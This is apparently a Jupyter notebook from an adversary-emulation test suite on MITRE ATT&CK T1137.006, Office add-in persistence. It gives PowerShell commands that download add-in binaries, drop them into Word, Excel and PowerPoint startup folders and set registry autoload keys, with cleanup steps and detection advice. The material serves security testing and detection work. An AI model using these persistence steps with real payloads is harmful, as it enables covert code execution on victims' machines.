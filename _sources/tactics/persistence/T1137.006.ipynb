{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "98788541",
   "metadata": {},
   "source": "# T1137.006 - Add-ins\nAdversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. "
  },
  {
   "cell_type": "markdown",
   "id": "676fc265",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ee0c4e14",
   "metadata": {},
   "source": "### Atomic Test #1 - Code Executed Via Excel Add-in File (XLL)\nLoads an XLL file using the excel add-ins library.\nThis causes excel to launch Notepad.exe as a child process. This atomic test does not include persistent code execution as you would typically see when this is implemented in malware.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Excel must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n\n```\n##### Description: XLL files must exist on disk at specified location\n##### Check Prereq Commands:\n```powershell\nif ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bea1f50",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a924449c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "03f1308e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "be891552",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "395eb65a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d8cb1adb",
   "metadata": {},
   "source": "### Atomic Test #2 - Persistent Code Execution Via Excel Add-in File (XLL)\nCreates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started\nThe sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Excel must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n\n```\n##### Description: XLL files must exist on disk at specified location\n##### Check Prereq Commands:\n```powershell\nif ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f412f60",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e9fb07db",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1aa4610",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "60e33572",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$ver = (New-Object -COMObject \"Excel.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61cbf5cc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "22fe3f3d",
   "metadata": {},
   "source": "### Atomic Test #3 - Persistent Code Execution Via Word Add-in File (WLL)\nCreates a Word Add-in file (WLL) which runs automatically when Word is started\nThe sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\nSuccessfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Word must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```\n##### Description: WLL files must exist on disk at specified location\n##### Check Prereq Commands:\n```powershell\nif ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\")) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a14f6c45",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3137ce7c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d8e8687",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "2dee5972",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26c80d29",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a1e320b6",
   "metadata": {},
   "source": "### Atomic Test #4 - Persistent Code Execution Via Excel VBA Add-in File (XLAM)\nCreates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started\nThe sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Excel must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n\n```\n##### Description: XLAM file must exist on disk at specified location\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "043d746d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c57d32ee",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "adefba4d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "e2646258",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "acdc535d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9f9531ff",
   "metadata": {},
   "source": "### Atomic Test #5 - Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)\nCreates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started\nThe sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Excel must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"PowerPoint.Application\" | Out-Null\n  Stop-Process -Name \"PowerPnt\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft PowerPoint manually to meet this requirement\"\n\n```\n##### Description: PPAM file must exist on disk at specified location\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aac2ae1c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "efd80aa4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "38acea61",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "f1cadabe",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"PowerPnt\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.ppam\"  -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1af73156",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1137.006 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "82a3ca20",
   "metadata": {},
   "source": "## Detection\nMonitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}